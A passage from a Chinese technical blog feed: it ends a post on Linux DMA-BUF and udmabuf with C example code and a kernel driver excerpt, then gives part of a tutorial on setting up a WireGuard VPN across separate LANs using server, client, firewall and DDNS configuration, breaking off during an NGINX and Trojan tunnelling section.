class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf[<span class="hljs-number">0x1000</span> * i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试，成功完成内核到用户态的数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/MQbFuS1cDP7htm3.png"></p><blockquote><p> 当然，内核的开发实际上是非常灵活的，事实上，我们可以直接实现设备文件接口的 <code>mmap()</code> 并在其中映射 <code>dma_buf</code> ，从而简化代码流程：）</p></blockquote><h1 id="0x03-udmabuf：简易封装接口"><a href="#0x03-udmabuf：简易封装接口" class="headerlink" title="0x03. udmabuf：简易封装接口"></a>0x03. udmabuf：简易封装接口</h1><p>得益于 <code>dma_buf</code> 的好用，Linux kernel <a href="https://patchwork.kernel.org/project/qemu-devel/patch/20180313154826.20436-1-kraxel@redhat.com/">于 2018 年</a>引入了一个封装好的 <code>dma_buf</code> 设备驱动——<code>udmabuf</code> ，其在内核中实现了一个封装好的 exporter，并支持通过 <code>ioctl()</code> 创建 <code>dma_buf</code> 以在用户态程序之间进行内存共享</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p><code>udmabuf</code> 的基本使用方式非常简单：</p><ul><li>使用 <code>memfd_create()</code> 创建一个文件描述符</li><li>封装 <code>udmabuf_create</code> 请求，通过 <code>ioctl(&quot;/dev/udmabuf&quot;)</code> 获取 <code>dma_buf</code> 的 fd</li><li>通过 <code>mmap()</code> 进行访问</li></ul><p>有了 <code>dma_buf</code> 的 fd，后面的内存访问操作就和之前没什么区别了，在进程间进行共享只需要共享这个文件描述符即可（例如使用 UNIX domain socket）</p><p>这里给出一个示例程序，文件描述符直接通过 <code>fork()</code> 共享：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *buf1, *buf2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf1 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf1) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">size_t</span>*) &amp;buf1[i * <span class="hljs-number">0x1000</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf1[i * <span class="hljs-number">0x1000</span> + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        buf2 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!buf2) &#123;<br>            perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf2[<span class="hljs-number">0x1000</span> * i]);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>测试，成功完成数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/JOojDcGvU4XK1T5.png"></p><h2 id="内部实现（🕊）"><a href="#内部实现（🕊）" class="headerlink" title="内部实现（🕊）"></a>内部实现（🕊）</h2><p>udmabuf 的实现非常简单，主要就是注册了一个杂项设备 <code>/dev/udmabuf</code> ，并支持两个自定义的 IOCTL 命令：</p><blockquote><p>&#x2F;drivers&#x2F;dma-buf&#x2F;udmabuf.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">long</span> ret;<br><br><span class="hljs-keyword">switch</span> (ioctl) &#123;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE:<br>ret = udmabuf_ioctl_create(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE_LIST:<br>ret = udmabuf_ioctl_create_list(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ret = -ENOTTY;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">udmabuf_fops</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.unlocked_ioctl = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_ioctl   = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">udmabuf_misc</span> =</span> &#123;<br>.minor          = MISC_DYNAMIC_MINOR,<br>.name           = <span class="hljs-string">&quot;udmabuf&quot;</span>,<br>.fops           = &amp;udmabuf_fops,<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;世界第一 DMA-BUF 大师是对的！&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x04】使用 Wireguard 进行异地组网</title>
    <link href="https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/"/>
    <id>https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/</id>
    <published>2024-10-22T13:26:19.000Z</published>
    <updated>2024-11-11T10:41:29.792Z</updated>
    
    <content type="html"><![CDATA[<p>龙哥就是龙！惹啊！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近手上的各种服务器不知道为啥多了起来，但大都没有公网 IP，又都处在不同的局域网里，笔者的肉身连带自己的笔记本也没有办法同时处在这些不同的网络当中，因此笔者迫切需要一个可用且优雅的异地组网方案，从而让笔者能够无论身处何处都能随时访问不同局域网中的任意一台服务器， <del>当然现在看来这些服务器大部分情况下的用途似乎就是让笔者闲暇时刻运行 neofetch 和 btop 玩玩</del></p><p>局域网（Local Area Network）也就是我们常说的内网，此类网络通常共用一个连接到互联网（公网）的路由器，共用同一公网 IP，利用网络地址转换（Network Address Translation）技术为内网中的设备与公网服务器建立连接（简而言之就是公网 <code>IP:端口</code> 到内网 <code>IP:端口</code> 整了个映射），因此要与内网中的设备进行通信，我们实质上要实现 <strong>内网穿透</strong> ，也叫 <strong>NAT 穿透</strong> （NAT traversal）</p><p><img src="https://s2.loli.net/2024/10/10/MjaG5i82cKsqoXz.png"></p><p>这个需求的实现其实很简单，我们只需要把不同 LAN 当中的设备组到同一个虚拟网络当中就行—— <code>Virtual Private Network</code> 就是专业干这个的，我们可以使用 VPN 技术在设备间建立点对点的加密信道，从而将不同局域网当中的服务器连接起来，而若要为都处于内网的机器进行打洞，则通常需要有一台位于公网的服务器为他们进行中继：</p><p><img src="https://s2.loli.net/2024/10/21/I62pACK4hQedEnB.png"></p><p>现有的比较成熟的无需用户自行在公网架设服务器的异地组网服务有 tailscale、zerotier 等，但由于其在中国大陆内通常没有相应的中继服务器，从而导致在国内想要通过此类服务进行连接则往往带有一定的延迟（反正笔者是忍受不了）</p><p><img src="https://s2.loli.net/2024/10/21/gfMBh2R81baV5SG.png"></p><p>如何解决这个问题？不难想到我们可以在公网 VPS 上自行搭建 tailscale 的 DERP 节点，或是自建 zerotier 的 Moon 节点，但既然都要自建节点了， <em>那么我们为什么不直接自建 VPN 呢</em> —— 诸如 IPSec、OpenVPN 等老牌 VPN 方案可谓是应有尽有</p><p>但相比于这些传统方案，笔者更愿意选择被 Linus 青睐甚至已经合并入 Linux kernel mainline 的 <strong>WireGuard</strong> —— 这是一个高性能的基于 UDP 的现代 VPN 协议，或许也是目前已知的最好的 VPN 解决方案</p><p><img src="https://s2.loli.net/2024/10/22/8M5FgnkYtdzCqVU.png"></p><p>本篇博客主要讲述如何利用公网服务器搭建 WireGuard VPN 网络</p><h1 id="0x01-公网服务器基本配置"><a href="#0x01-公网服务器基本配置" class="headerlink" title="0x01. 公网服务器基本配置"></a>0x01. 公网服务器基本配置</h1><h2 id="安装与配置-WireGuard"><a href="#安装与配置-WireGuard" class="headerlink" title="安装与配置 WireGuard"></a>安装与配置 WireGuard</h2><p>首先我们在公网服务器上安装 WireGuard，笔者这里是 <code>Ubuntu 24.04</code>：</p><blockquote><p>参考： <a href="https://www.wireguard.com/install/">WireGuard - Installation</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install wireguard</span><br></code></pre></td></tr></table></figure><p>完成安装之后我们会获得一个内核模块，以及相应的用户态 CLI 程序 <code>wg</code> ：</p><p><img src="https://s2.loli.net/2024/10/21/Aiw9cQTp4k537B6.png"></p><p>接下来使用 <code>wg</code> 生成一份私钥与对应的公钥，存放在 <code>/etc/wireguard</code> 目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>接下来创建 WireGuard 配置文件，这里我们放在 <code>/etc/wireguard/wg0.conf</code> ，写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 私钥文件内容<br><span class="hljs-attr">ListenPort</span> = 自定义的监听端口<br><span class="hljs-attr">Address</span> = 自定义的内网地址，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o 你的能访问公网的网卡名 -j MASQUERADE</span><br><span class="hljs-attr">PostDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o 你的能访问公网的网卡名 -j MASQUERADE</span><br></code></pre></td></tr></table></figure><p>这里的 <code>PostUp</code> 与 <code>PostDown</code> 参数分别为接口启动时与关闭时执行的命令，其中 <code>wg0</code> 为我们后面要创建的虚拟网卡名，该命令主要用于流量转发，这里不再赘叙</p><p>对于可以访问公网的网卡的名称，可以简单通过如下命令进行获取：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip -o -4 route show to default | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><p>接下来使用如下命令启动该接口，其会创建一个虚拟网卡 <code>wg0</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/10/21/nvVi1fWaR3ZLDEd.png"></p><p>最后，我们可以为 <code>wg0</code> 接口配置自启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h2 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h2><p>为了让 iptables 规则正常工作，我们还需要修改防火墙以允许 IPV4 流量转发，首先编辑 <code>/etc/sysctl.conf</code> 文件，添加如下配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>也可以在 WireGuard 配置文件中的 <code>[Interface]</code> 添加如下配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">PostUp</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">1</span><br><span class="hljs-attr">PostDown</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></blockquote><p>然后重新载入配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -p</span><br></code></pre></td></tr></table></figure><p>最后开启 wireguard 监听端口上的 UDP 连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 你的自定义端口/udp</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你使用阿里云这样比较专业的云服务器提供商，你可能还需要在相应的控制台页面添加规则：</p><p><img src="https://s2.loli.net/2024/10/21/XmPRkVf6yJzWKCj.png"></p></blockquote><h1 id="0x02-客户端基本配置"><a href="#0x02-客户端基本配置" class="headerlink" title="0x02. 客户端基本配置"></a>0x02. 客户端基本配置</h1><h2 id="Linux-客户端配置"><a href="#Linux-客户端配置" class="headerlink" title="Linux 客户端配置"></a>Linux 客户端配置</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>首先还是按惯例在本地安装 WireGuard，这里笔者的系统是 <code>openSUSE Tumbleweed</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wireguard-tools</span><br></code></pre></td></tr></table></figure><p>然后按惯例生成公钥与私钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>接下来修改服务端配置文件， <strong>添加</strong> 客户端配置如下：</p><blockquote><p>每新增一个客户端就添加一份 <code>[Peer]</code> 配置</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 客户端生成的公钥<br><span class="hljs-attr">AllowedIPs</span> = 自定义的内网地址，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>重启服务端 WireGuard：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick down wg0 &amp;&amp; sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>然后创建配置文件 <code>/etc/wireguard/wg0.conf</code> ，写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端生成的私钥<br><span class="hljs-attr">Address</span> = 上面配置的客户端地址<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端的公钥<br><span class="hljs-attr">Endpoint</span> = 服务端的公网地址或是域名:服务端的端口<br><span class="hljs-attr">AllowedIPs</span> = 服务端网段，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你不止想要组网，还想要让 WireGuard 服务端代理客户端的全部流量，只需要配置客户端的 <code>AllowedIPs = 0.0.0.0/0</code> 即可</p></blockquote><p>最后按惯例启动 WireGuard 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>如果有需要，可以配置自启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h3 id="配置-DDNS"><a href="#配置-DDNS" class="headerlink" title="配置 DDNS"></a>配置 DDNS</h3><p>作为中继的公网服务器的 IP 在某些需求下不一定是恒定的，虽然说域名通常是可以不变的，但有的时候域名对应的 IP 可能会发生改变，而 WireGuard 不会重复进行解析，仅会使用第一次的结果，从而可能造成组网失败 ：（</p><p>对于 Linux，WireGuard 官方已经提供了 <a href="https://github.com/WireGuard/wireguard-tools/tree/master/contrib/reresolve-dns">一份自动重新解析 DNS 的脚本</a> ，我们只需要设置一个定时执行任务即可，例如使用 <code>crontab</code> ：</p><blockquote><p>在 Ubuntu 下，该脚本似乎会默认在 <code>/usr/share/doc/wireguard-tools/examples/reresolve-dns/reresolve-dns.sh</code> 安装一份</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cron">1 * * * * 脚本所在目录/reresolve-dns.sh wg0 # 每小时执行一次<br></code></pre></td></tr></table></figure><h2 id="Windows-客户端配置"><a href="#Windows-客户端配置" class="headerlink" title="Windows 客户端配置"></a>Windows 客户端配置</h2><blockquote><p>不用 Windows 👋</p></blockquote><p>首先从<a href="https://download.wireguard.com/windows-client/">官网</a>下载对应架构的安装包并安装，选择新建空隧道：</p><p><img src="https://s2.loli.net/2024/10/22/mlQ3A6qL8pH7uW1.png"></p><p>其会自动生成一份私钥和公钥，我们只需要再按照前面的方式填写配置文件即可：</p><p><img src="https://s2.loli.net/2024/10/22/osNnbW2zGuFT9I7.png"></p><p>之后在服务端也添加相应配置并重启 WireGuard 即可</p><h1 id="0x03-利用-NGINX-反代-WireGuard-Over-Trojan"><a href="#0x03-利用-NGINX-反代-WireGuard-Over-Trojan" class="headerlink" title="0x03. 利用 NGINX 反代 WireGuard Over Trojan"></a>0x03. 利用 NGINX 反代 WireGuard Over Trojan</h1><blockquote><p>注：这会让速度大幅下降➕延迟大幅提高（毕竟多了好几层传输和加解密的工作），因此除非 Wireguard 直连无法完成配置，否则笔者 <em>其实不太推荐搭建这样的架构</em> </p></blockquote><p>众所周知随着国际网络局势不断变化，前面忘了中间忘了后面也忘了，总而言之就是跨国或是跨地区的 WireGuard 直接组网因为各种直接或间接的因素而存在一定的小问题导致无法连接成功，因此需要为我们的 WireGuard 隧道套一些防护</p><p>基于 UDP 的 WireGuard 协议容易被各种预期外的物理因素识别与阻断，因此我们不难想到的是我们可以再套几层协议以提高其连接稳定性，在 <a href="https://arttnba3.cn/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/">如何在澳洲校园网玩原神</a> 这一篇博客中笔者简要叙述了使用 NGINX + Websocket + TLS + Trojan 的代理方案，在这里我们同样可以利用类似的架构转发 Wireguard 流量完成组网</p><p><img src="https://s2.loli.net/2024/11/08/Ym5e8gaBD6RduEy.png" alt="随手画了个图，可能有点难看，不过大概是这个意思"></p><blockquote><p>注：似乎 WireGuard 在这个架构当中是多余的，也可以直接用 Xray 组网？</p></blockquote><h2 id="公网服务器配置"><a href="#公网服务器配置" class="headerlink" title="公网服务器配置"></a>公网服务器配置</h2><blockquote><p>注：可以通过 CloudFlare CDN 代理隐藏公网服务器真实 IP，但需要注意的是在部分网络线路下 CloudFlare 的部分网段是被屏蔽的，从而导致可用性下降</p></blockquote><h3 id="1️⃣-配置-WireGuard"><a href="#1️⃣-配置-WireGuard" class="headerlink" title="1️⃣ 配置 WireGuard"></a>1️⃣ 配置 WireGuard</h3><p>和前面的流程基本一样，这里不再赘叙</p><h3 id="2️⃣-配置-NGINX-反向代理"><a href="#2️⃣-配置-NGINX-反向代理" class="headerlink" title="2️⃣ 配置 NGINX 反向代理"></a>2️⃣ 配置 NGINX 反向代理</h3><p>首先是安装与启用 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nginx</span><br><span class="hljs-meta 